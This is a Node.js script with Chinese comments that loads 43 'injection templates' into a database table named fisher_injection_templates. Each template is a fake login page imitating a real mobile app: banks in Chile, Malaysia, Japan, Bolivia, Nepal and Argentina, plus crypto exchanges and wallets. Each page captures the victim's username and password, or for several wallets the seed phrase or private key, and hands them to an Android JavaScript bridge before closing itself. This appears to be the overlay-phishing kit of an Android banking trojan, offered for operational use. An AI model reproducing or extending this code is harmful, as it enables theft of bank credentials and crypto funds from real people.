/**
 * 批量插入银行注入模板到 fisher_injection_templates 表
 * 共 43 个模板：智利2 + 马来西亚11 + 日本8 + 玻利维亚5 + 尼泊尔5 + 阿根廷5 + 加密货币7
 * 
 * 表结构: id(auto), template_id(varchar64 unique), name, package_name, icon, color, file, type, html_content, enabled, visible, created_at, updated_at
 * template_id 格式: "名称_包名"
 */
const mysql = require('mysql2/promise');
const config = require('./config');

function generateHTML(bankName, logoText, primaryColor, bgColor, placeholderUser, placeholderPass, btnText) {
  return `<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>${bankName}</title>
<style>
body { margin:0; padding:0; font-family:sans-serif; background:${bgColor}; min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; }
.container { width:90%; max-width:360px; padding:30px; }
.logo { text-align:center; margin-bottom:30px; font-size:24px; font-weight:bold; color:${primaryColor}; }
input { width:100%; padding:14px; margin:8px 0; border:1px solid #ddd; border-radius:8px; font-size:16px; box-sizing:border-box; }
button { width:100%; padding:14px; margin-top:20px; background:${primaryColor}; color:#fff; border:none; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; }
</style>
</head><body>
<div class="container">
<div class="logo">${logoText}</div>
<input type="text" id="login" placeholder="${placeholderUser}">
<input type="password" id="password" placeholder="${placeholderPass}">
<button onclick="submitForm()">${btnText}</button>
</div>
<script>
function submitForm() {
  var login = document.getElementById('login').value;
  var password = document.getElementById('password').value;
  if (!login || !password) { alert('Please fill all fields'); return; }
  if (typeof Android !== 'undefined' && Android.returnResult) {
    Android.returnResult(JSON.stringify({"login": login, "password": password}));
    setTimeout(function() { if (typeof Android !== 'undefined' && Android.close) Android.close(); }, 500);
  }
}
</script>
</body></html>`;
}

function nowStr() {
  return new Date().toISOString().replace('T', ' ').substring(0, 19);
}

const templates = [
  // ===== 智利 (2个) - 西班牙语 =====
  {
    name: 'BancoEstado（智利国家银行）',
    package_name: 'cl.bancochile.bancoestado',
    color: '#005DA4',
    type: 'bank',
    html: generateHTML('BancoEstado', 'BancoEstado', '#005DA4', '#f5f7fa', 'Ingrese su RUT o usuario', 'Ingrese su clave', 'Ingresar')
  },
  {
    name: 'Banco Ripley（里普利银行）',
    package_name: 'cl.ripley.banco',
    color: '#7B2D8B',
    type: 'bank',
    html: generateHTML('Banco Ripley', 'Banco Ripley', '#7B2D8B', '#f5f7fa', 'Ingrese su RUT o usuario', 'Ingrese su clave', 'Ingresar')
  },

  // ===== 马来西亚 (11个) - 马来语/英语 =====
  {
    name: 'Maybank（马来亚银行）',
    package_name: 'com.maybank2u.life',
    color: '#FDB813',
    type: 'bank',
    html: generateHTML('Maybank', 'Maybank2u', '#FDB813', '#fff8e1', 'Username / Nama Pengguna', 'Password / Kata Laluan', 'Login')
  },
  {
    name: 'CIMB Bank（联昌国际银行）',
    package_name: 'com.cimb.mobile.banking',
    color: '#ED1C24',
    type: 'bank',
    html: generateHTML('CIMB Bank', 'CIMB Clicks', '#ED1C24', '#f5f7fa', 'User ID / ID Pengguna', 'Password / Kata Laluan', 'Log In')
  },
  {
    name: 'Public Bank（大众银行）',
    package_name: 'com.pbb.appworld.publicbank',
    color: '#003DA5',
    type: 'bank',
    html: generateHTML('Public Bank', 'Public Bank', '#003DA5', '#f5f7fa', 'Username', 'Password', 'Login')
  },
  {
    name: 'Hong Leong Bank（丰隆银行）',
    package_name: 'com.hlb.mobileconnect',
    color: '#009FE3',
    type: 'bank',
    html: generateHTML('Hong Leong Bank', 'Hong Leong Connect', '#009FE3', '#f5f7fa', 'Username / Nama Pengguna', 'Password / Kata Laluan', 'Login')
  },
  {
    name: 'RHB Bank（RHB银行）',
    package_name: 'com.rhbgroup.rhbmobilebanking',
    color: '#0066CC',
    type: 'bank',
    html: generateHTML('RHB Bank', 'RHB Mobile', '#0066CC', '#f5f7fa', 'Username', 'Password', 'Log In')
  },
  {
    name: 'AmBank（大马银行）',
    package_name: 'my.ambank.ambankonline',
    color: '#004C97',
    type: 'bank',
    html: generateHTML('AmBank', 'AmOnline', '#004C97', '#f5f7fa', 'Username / Nama Pengguna', 'Password / Kata Laluan', 'Login')
  },
  {
    name: 'Alliance Bank（联盟银行）',
    package_name: 'com.alliancebank.alliance',
    color: '#003366',
    type: 'bank',
    html: generateHTML('Alliance Bank', 'Alliance Bank', '#003366', '#f5f7fa', 'User ID', 'Password', 'Login')
  },
  {
    name: 'MBSB Bank（马来西亚建设银行）',
    package_name: 'com.mbsb.bank',
    color: '#003DA5',
    type: 'bank',
    html: generateHTML('MBSB Bank', 'MBSB Bank', '#003DA5', '#f5f7fa', 'Username / Nama Pengguna', 'Password / Kata Laluan', 'Login')
  },
  {
    name: 'UOB（大华银行）',
    package_name: 'com.uob.mighty',
    color: '#003DA5',
    type: 'bank',
    html: generateHTML('UOB', 'UOB Mighty', '#003DA5', '#f5f7fa', 'Username', 'Password', 'Log In')
  },
  {
    name: 'OCBC（华侨银行）',
    package_name: 'com.ocbc.mobile',
    color: '#ED1C24',
    type: 'bank',
    html: generateHTML('OCBC', 'OCBC Bank', '#ED1C24', '#f5f7fa', 'Username', 'Password', 'Login')
  },
  {
    name: 'Standard Chartered MY（渣打马来西亚）',
    package_name: 'com.sc.my.mobile',
    color: '#0072AA',
    type: 'bank',
    html: generateHTML('Standard Chartered', 'Standard Chartered', '#0072AA', '#f5f7fa', 'Username', 'Password', 'Log In')
  },

  // ===== 日本 (8个) - 日语 =====
  {
    name: '三菱UFJダイレクト（三菱UFJ银行）',
    package_name: 'jp.mufg.bk.applisp.app',
    color: '#CC0033',
    type: 'bank',
    html: generateHTML('三菱UFJダイレクト', '三菱UFJ銀行', '#CC0033', '#f5f7fa', '契約番号またはID', 'パスワード', 'ログイン')
  },
  {
    name: 'SMBCダイレクト（三井住友银行）',
    package_name: 'jp.co.smbc.direct',
    color: '#009944',
    type: 'bank',
    html: generateHTML('SMBCダイレクト', '三井住友銀行', '#009944', '#f5f7fa', '店番号・口座番号', 'パスワード', 'ログイン')
  },
  {
    name: 'みずほダイレクト（瑞穗银行）',
    package_name: 'jp.co.mizuho.mhbk.mobile',
    color: '#003399',
    type: 'bank',
    html: generateHTML('みずほダイレクト', 'みずほ銀行', '#003399', '#f5f7fa', 'お客さま番号', 'パスワード', 'ログイン')
  },
  {
    name: 'ゆうちょ銀行（邮储银行日本）',
    package_name: 'jp.japanpost.jp_bank.bankbook',
    color: '#007E3A',
    type: 'bank',
    html: generateHTML('ゆうちょ銀行', 'ゆうちょ銀行', '#007E3A', '#f5f7fa', 'お客さま番号', 'パスワード', 'ログイン')
  },
  {
    name: 'PayPay（PayPay支付）',
    package_name: 'jp.ne.paypay.android.app',
    color: '#FF0033',
    type: 'bank',
    html: generateHTML('PayPay', 'PayPay', '#FF0033', '#f5f7fa', '携帯電話番号またはID', 'パスワード', 'ログイン')
  },
  {
    name: 'セブン銀行（七银行）',
    package_name: 'jp.co.sevenbank.AppPassbook',
    color: '#FF6600',
    type: 'bank',
    html: generateHTML('セブン銀行', 'セブン銀行', '#FF6600', '#f5f7fa', 'お客さま番号', 'パスワード', 'ログイン')
  },
  {
    name: 'りそな銀行（理索纳银行）',
    package_name: 'jp.co.resonabank.android',
    color: '#006633',
    type: 'bank',
    html: generateHTML('りそな銀行', 'りそな銀行', '#006633', '#f5f7fa', 'ログインID', 'パスワード', 'ログイン')
  },
  {
    name: 'Sony Bank（索尼银行）',
    package_name: 'jp.co.sonybank.android',
    color: '#000000',
    type: 'bank',
    html: generateHTML('Sony Bank', 'Sony Bank', '#000000', '#f5f7fa', 'ユーザーID', 'パスワード', 'ログイン')
  },

  // ===== 玻利维亚 (5个) - 西班牙语 =====
  {
    name: 'Banco Unión（玻利维亚联合银行）',
    package_name: 'bo.com.bancounion.mobilebanking',
    color: '#003399',
    type: 'bank',
    html: generateHTML('Banco Unión', 'Banco Unión', '#003399', '#f5f7fa', 'Número de cuenta o usuario', 'Contraseña', 'Ingresar')
  },
  {
    name: 'Banco Mercantil（梅尔坎蒂尔银行）',
    package_name: 'bo.com.bmsc.mobilebanking',
    color: '#003366',
    type: 'bank',
    html: generateHTML('Banco Mercantil', 'Banco Mercantil Santa Cruz', '#003366', '#f5f7fa', 'Usuario o número de cuenta', 'Contraseña', 'Ingresar')
  },
  {
    name: 'BNB（玻利维亚国民银行）',
    package_name: 'bo.com.bnb.mobilebanking',
    color: '#00539F',
    type: 'bank',
    html: generateHTML('BNB', 'BNB', '#00539F', '#f5f7fa', 'Usuario', 'Contraseña', 'Ingresar')
  },
  {
    name: 'Banco BISA（毕沙银行）',
    package_name: 'bo.com.bisa.mobilebanking',
    color: '#0066CC',
    type: 'bank',
    html: generateHTML('Banco BISA', 'Banco BISA', '#0066CC', '#f5f7fa', 'Usuario o CI', 'Contraseña', 'Ingresar')
  },
  {
    name: 'BancoSol（团结银行）',
    package_name: 'bo.com.bancosol.app',
    color: '#E31837',
    type: 'bank',
    html: generateHTML('BancoSol', 'BancoSol', '#E31837', '#f5f7fa', 'Número de cuenta o usuario', 'Contraseña', 'Ingresar')
  },

  // ===== 尼泊尔 (5个) - 尼泊尔语/英语 =====
  {
    name: 'Global IME Bank（全球IME银行）',
    package_name: 'com.globalimebank.app',
    color: '#003399',
    type: 'bank',
    html: generateHTML('Global IME Bank', 'Global IME Bank', '#003399', '#f5f7fa', 'Username / युजरनेम', 'Password / पासवर्ड', 'Login')
  },
  {
    name: 'Nabil Bank（纳比尔银行）',
    package_name: 'com.nabilbank.app',
    color: '#A51C30',
    type: 'bank',
    html: generateHTML('Nabil Bank', 'Nabil Bank', '#A51C30', '#f5f7fa', 'Username / युजरनेम', 'Password / पासवर्ड', 'Login')
  },
  {
    name: 'NIC ASIA Bank（NIC亚洲银行）',
    package_name: 'com.nicasia.ebanking',
    color: '#003DA5',
    type: 'bank',
    html: generateHTML('NIC ASIA Bank', 'NIC ASIA', '#003DA5', '#f5f7fa', 'Username / युजरनेम', 'Password / पासवर्ड', 'Login')
  },
  {
    name: 'Himalayan Bank（喜马拉雅银行）',
    package_name: 'com.himalayanbank.app',
    color: '#003366',
    type: 'bank',
    html: generateHTML('Himalayan Bank', 'Himalayan Bank', '#003366', '#f5f7fa', 'Username / युजरनेम', 'Password / पासवर्ड', 'Login')
  },
  {
    name: 'Everest Bank（珠穆朗玛银行）',
    package_name: 'com.everestbank.app',
    color: '#003399',
    type: 'bank',
    html: generateHTML('Everest Bank', 'Everest Bank', '#003399', '#f5f7fa', 'Username / युजरनेम', 'Password / पासवर्ड', 'Login')
  },

  // ===== 阿根廷 (5个) - 西班牙语 =====
  {
    name: 'Ualá（乌阿拉数字银行）',
    package_name: 'com.uala.app',
    color: '#5C3DD5',
    type: 'bank',
    html: generateHTML('Ualá', 'Ualá', '#5C3DD5', '#f5f7fa', 'Email o número de teléfono', 'Contraseña', 'Iniciar sesión')
  },
  {
    name: 'Brubank（布鲁银行）',
    package_name: 'com.brubank.app',
    color: '#5200FF',
    type: 'bank',
    html: generateHTML('Brubank', 'Brubank', '#5200FF', '#f5f7fa', 'Email o DNI', 'Contraseña', 'Iniciar sesión')
  },
  {
    name: 'MODO（阿根廷支付）',
    package_name: 'ar.com.modo.app',
    color: '#00C2FF',
    type: 'bank',
    html: generateHTML('MODO', 'MODO', '#00C2FF', '#f5f7fa', 'Número de teléfono', 'Contraseña', 'Ingresar')
  },
  {
    name: 'Banco Nación（阿根廷国民银行）',
    package_name: 'ar.com.bna.app',
    color: '#003DA5',
    type: 'bank',
    html: generateHTML('Banco Nación', 'Banco Nación', '#003DA5', '#f5f7fa', 'DNI o usuario', 'Contraseña', 'Ingresar')
  },
  {
    name: 'Banco Macro（马克罗银行）',
    package_name: 'com.bancomacro.mobilebanking',
    color: '#00529B',
    type: 'bank',
    html: generateHTML('Banco Macro', 'Banco Macro', '#00529B', '#f5f7fa', 'DNI o usuario', 'Contraseña', 'Ingresar')
  },

  // ===== 加密货币 (7个) - 英语 =====
  {
    name: 'Binance（币安）',
    package_name: 'com.binance.dev',
    color: '#F0B90B',
    type: 'crypto',
    html: generateHTML('Binance', 'Binance', '#F0B90B', '#1E2026', 'Email / Phone number', 'Password', 'Log In')
  },
  {
    name: 'OKX（欧易）',
    package_name: 'com.okinc.okex.gp',
    color: '#000000',
    type: 'crypto',
    html: generateHTML('OKX', 'OKX', '#000000', '#f5f7fa', 'Email / Phone number', 'Password', 'Log In')
  },
  {
    name: 'Crypto.com（加密货币平台）',
    package_name: 'co.mona.android',
    color: '#002D74',
    type: 'crypto',
    html: generateHTML('Crypto.com', 'Crypto.com', '#002D74', '#f5f7fa', 'Email address', 'Password', 'Log In')
  },
  {
    name: 'MetaMask（小狐狸钱包）',
    package_name: 'io.metamask',
    color: '#F6851B',
    type: 'crypto',
    html: generateHTML('MetaMask', 'MetaMask', '#F6851B', '#f5f7fa', 'Seed phrase or private key', 'Password', 'Unlock')
  },
  {
    name: 'Phantom（幻影钱包）',
    package_name: 'app.phantom',
    color: '#AB9FF2',
    type: 'crypto',
    html: generateHTML('Phantom', 'Phantom', '#AB9FF2', '#f5f7fa', 'Seed phrase or private key', 'Password', 'Unlock')
  },
  {
    name: 'Trust Wallet（信任钱包）',
    package_name: 'com.wallet.crypto.trustapp',
    color: '#0500FF',
    type: 'crypto',
    html: generateHTML('Trust Wallet', 'Trust Wallet', '#0500FF', '#f5f7fa', 'Seed phrase or private key', 'Password', 'Unlock')
  },
  {
    name: 'Exodus（出埃及钱包）',
    package_name: 'exodusmovement.exodus',
    color: '#6B47ED',
    type: 'crypto',
    html: generateHTML('Exodus', 'Exodus', '#6B47ED', '#f5f7fa', 'Email address', 'Password', 'Log In')
  }
];

async function main() {
  let db;
  try {
    db = await mysql.createConnection(config.mysql);
    console.log('Connected to MySQL');

    const now = nowStr();
    let inserted = 0;
    let skipped = 0;

    for (const tpl of templates) {
      const templateId = `${tpl.name}_${tpl.package_name}`;
      try {
        await db.query(
          `INSERT INTO fisher_injection_templates (template_id, name, package_name, icon, color, file, type, html_content, enabled, visible, created_at, updated_at)
           VALUES (?, ?, ?, '', ?, '', ?, ?, 1, 1, ?, ?)
           ON DUPLICATE KEY UPDATE name=VALUES(name), html_content=VALUES(html_content), color=VALUES(color), updated_at=VALUES(updated_at)`,
          [templateId, tpl.name, tpl.package_name, tpl.color, tpl.type, tpl.html, now, now]
        );
        inserted++;
        console.log(`[${inserted}/${templates.length}] OK: ${tpl.package_name}`);
      } catch (err) {
        skipped++;
        console.error(`FAIL: ${tpl.package_name} - ${err.message}`);
      }
    }

    console.log(`\nDone! Inserted/Updated: ${inserted}, Failed: ${skipped}`);

    // 验证总数
    const [rows] = await db.query('SELECT COUNT(*) as cnt FROM fisher_injection_templates');
    console.log(`Total templates in database: ${rows[0].cnt}`);

    // 验证新插入的
    const [newRows] = await db.query('SELECT template_id, name, package_name FROM fisher_injection_templates WHERE created_at = ?', [now]);
    console.log(`New templates inserted this run: ${newRows.length}`);

  } catch (err) {
    console.error('Error:', err.message);
  } finally {
    if (db) await db.end();
  }
}

main();
